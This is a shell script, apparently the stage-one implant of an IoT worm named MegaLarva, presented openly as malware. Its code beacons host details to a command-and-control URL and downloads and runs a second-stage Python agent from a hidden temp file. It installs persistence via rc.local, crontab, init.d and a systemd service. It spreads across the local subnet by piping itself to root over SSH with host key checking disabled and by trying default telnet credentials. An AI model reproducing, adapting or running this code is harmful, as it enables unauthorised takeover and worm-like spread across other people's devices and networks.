#!/bin/sh
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  MegaLarva IoT Agent — Two-stage zero-dep worm implant                  ║
# ║  Stage 1: Shell heartbeat + persistence                                 ║
# ║  Stage 2: Download & exec Python MegaLarva agent                        ║
# ║  by🇭🇷PhonkAlphabet                                                     ║
# ╚══════════════════════════════════════════════════════════════════════════╝
# Compatible with: Linux (arm, mips, mipsel, x86, x86_64)
# Dependencies: wget OR curl, sh, optionally python3/python

C2="127.0.0.1"
TOKEN="CHANGE_ME_STATIC_TOKEN"
BEACON_URL="http://${C2}:10002/beacon"
DOWNLOAD_URL="http://${C2}:10002/MegaLarva.py"

# Generate unique host ID
HOST_ID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null | cut -c1-8 || \
           dd if=/dev/urandom bs=8 count=1 2>/dev/null | md5sum | cut -c1-8 || \
           echo "iot-$$")

get_ip() {
    local ip
    ip=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
    [ -z "$ip" ] && ip=$(ifconfig eth0 2>/dev/null | grep 'inet ' | awk '{print $2}')
    [ -z "$ip" ] && ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    [ -z "$ip" ] && ip="unknown"
    echo "$ip"
}

get_arch() { uname -m 2>/dev/null || echo "unknown"; }

beacon() {
    local ip=$(get_ip)
    local arch=$(get_arch)
    local data="{\"id\":\"$HOST_ID\",\"ip\":\"$ip\",\"arch\":\"$arch\"}"
    
    # Priority: curl > wget
    if command -v curl >/dev/null 2>&1; then
        curl -s -X POST -H "X-Auth-Token: $TOKEN" \
             -H "Content-Type: application/json" \
             -d "$data" "$BEACON_URL" >/dev/null 2>&1
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O- --post-data="$data" \
             --header="X-Auth-Token: $TOKEN" \
             --header="Content-Type: application/json" \
             "$BEACON_URL" >/dev/null 2>&1
    fi
}

download_and_exec() {
    local tmp="/tmp/.mega_$$.py"
    
    # Download MegaLarva.py
    if command -v curl >/dev/null 2>&1; then
        curl -s -o "$tmp" "$DOWNLOAD_URL" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$tmp" "$DOWNLOAD_URL" 2>/dev/null
    fi
    
    # Execute if downloaded
    if [ -f "$tmp" ] && [ -s "$tmp" ]; then
        chmod +x "$tmp"
        if command -v python3 >/dev/null 2>&1; then
            nohup python3 "$tmp" --auto --interval 300 >/dev/null 2>&1 &
        elif command -v python >/dev/null 2>&1; then
            nohup python "$tmp" --auto --interval 300 >/dev/null 2>&1 &
        fi
        disown
    fi
}

persist() {
    # rc.local
    for rc in /etc/rc.local /etc/rc.d/rc.local /etc/init.d/bootmisc.sh /etc/inittab; do
        if [ -f "$rc" ] && [ -w "$rc" ]; then
            if ! grep -q "MegaLarva" "$rc" 2>/dev/null; then
                echo "$0 --daemon &" >> "$rc" 2>/dev/null
            fi
        fi
    done
    
    # crontab
    if command -v crontab >/dev/null 2>&1; then
        local cr=$(crontab -l 2>/dev/null)
        if ! echo "$cr" | grep -q "$0"; then
            {
                echo "$cr"
                echo "*/15 * * * * $0 --daemon >/dev/null 2>&1"
            } | crontab - 2>/dev/null
        fi
    fi
    
    # init.d alternative
    if [ -d /etc/init.d ] && [ -w /etc/init.d ]; then
        echo "#!/bin/sh
# MegaLarva IoT Agent
case \"\$1\" in
    start) $0 --daemon & ;;
    stop) pkill -f MegaLarva 2>/dev/null ;;
    *) \$0 --daemon & ;;
esac" > /etc/init.d/megalarva 2>/dev/null
        chmod +x /etc/init.d/megalarva 2>/dev/null
        update-rc.d megalarva defaults 2>/dev/null || true
    fi
    
    # systemd
    if command -v systemctl >/dev/null 2>&1; then
        local svc="/etc/systemd/system/megalarva.service"
        if [ ! -f "$svc" ]; then
            echo "[Unit]
Description=MegaLarva IoT Agent
After=network.target

[Service]
Type=simple
ExecStart=$0 --daemon
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target" > "$svc" 2>/dev/null
            systemctl daemon-reload 2>/dev/null
            systemctl enable megalarva 2>/dev/null
            systemctl start megalarva 2>/dev/null
        fi
    fi
}

self_propagate() {
    # Scan local subnet for open ports
    local base=$(get_ip | cut -d. -f1-3)
    [ "$base" = "unknown" ] && return
    for i in $(seq 1 254); do
        local target="${base}.${i}"
        [ "$target" = "$(get_ip)" ] && continue
        
        # Quick port check
        (echo "" >/dev/tcp/$target/22) 2>/dev/null && \
            echo "$0 --daemon" | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@$target "sh -s" 2>/dev/null &
        
        (echo "" >/dev/tcp/$target/23) 2>/dev/null && \
            (sleep 1; echo -e "root\nadmin\n$0\n" | telnet $target 2>/dev/null) &
    done
    wait
}

# ─── MAIN ───────────────────────────────────────────────────────────────────
main() {
    # Handle daemon mode (detach)
    if [ "$1" = "--daemon" ]; then
        shift
        # Already daemonized
        :
    elif [ "$1" = "--oneshot" ]; then
        beacon
        download_and_exec
        exit 0
    fi
    
    # Main loop
    while :; do
        beacon
        download_and_exec
        persist
        
        # Only self-propagate if we have network tools available
        if command -v ssh >/dev/null 2>&1 || command -v telnet >/dev/null 2>&1; then
            self_propagate
        fi
        
        sleep 300  # 5 minute loop
    done
}

main "$@"
